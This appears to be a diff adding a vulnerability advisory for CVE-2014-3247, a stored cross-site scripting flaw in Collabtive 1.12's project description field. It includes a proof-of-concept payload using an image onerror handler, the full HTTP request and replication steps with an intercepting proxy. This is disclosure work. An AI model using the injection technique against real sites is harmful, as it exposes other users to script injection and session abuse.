@@ -1,0 +1,51 @@
+Vulnerability title: Stored XSS vulnerability in Collabtive application
+(CVE-2014-3247)
+CVE: CVE-2014-3247(coordinated with cve assigning team and vendor)
+Vendor: Collabtive
+Product: Collabtive (Open Source Project Management Software)
+Affected version: 1.12
+Fixed version: 2.0
+Reported by: Deepak Rathore
+Severity: Critical
+URL: http://[domain]/collabtive-12/admin.php?action=addpro
+Affected Users: Authenticated users
+Affected parameter(s): desc
+
+Issue details: The value of the desc request parameter is copied into the
+HTML document as plain text between tags. The payload 1c91c<img%20src%3da
+%20onerror%3dalert(1) >cc245622da6 was submitted in the desc parameter.
+This input was echoed as 1c91c<img src=a onerror=alert(1) >cc245622da6 in
+the application's response.  This proof-of-concept attack demonstrates that
+it is possible to inject arbitrary JavaScript into the application's
+response. The proof-of-concept attack demonstrated uses an event handler to
+introduce arbitrary JavaScript into the document.
+
+HTTP request:
+POST /collabtive-12/admin.php?action=addpro HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:28.0) Gecko/20100101
+Firefox/28.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://localhost/collabtive-12/index.php?mode=login
+Cookie: PHPSESSID=ri2sqmga763p7qav73enfv99p5
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 75
+name=test&desc=test928a4<img%20src%3da%20onerror%3dalert(1)>a480a723950&neverdue=neverdue&budget=10&assignto%5B%5D=1&assignme=1
+
+Steps to replicate:
+1. Login into application
+2. Go to "Desktop" tab and click on "Add project"
+3. Fill the project details in the project form and click on "Add" button
+4. Intercept request by interception proxy i.e. OWASP Zap, Burp Suite etc
+5. Replace "desc" parameter value with "1c91c<img%20src%3da
+%20onerror%3dalert(1) >cc245622da6"
+6. Forward manipulated request to server and wait for response in browser
+7. A popup with alert message will come that is the proof of vulnerability.
+
+Tools used: Burp Suite proxy, Mozilla Firefox browser
+
+Best Regards,
+Deepak
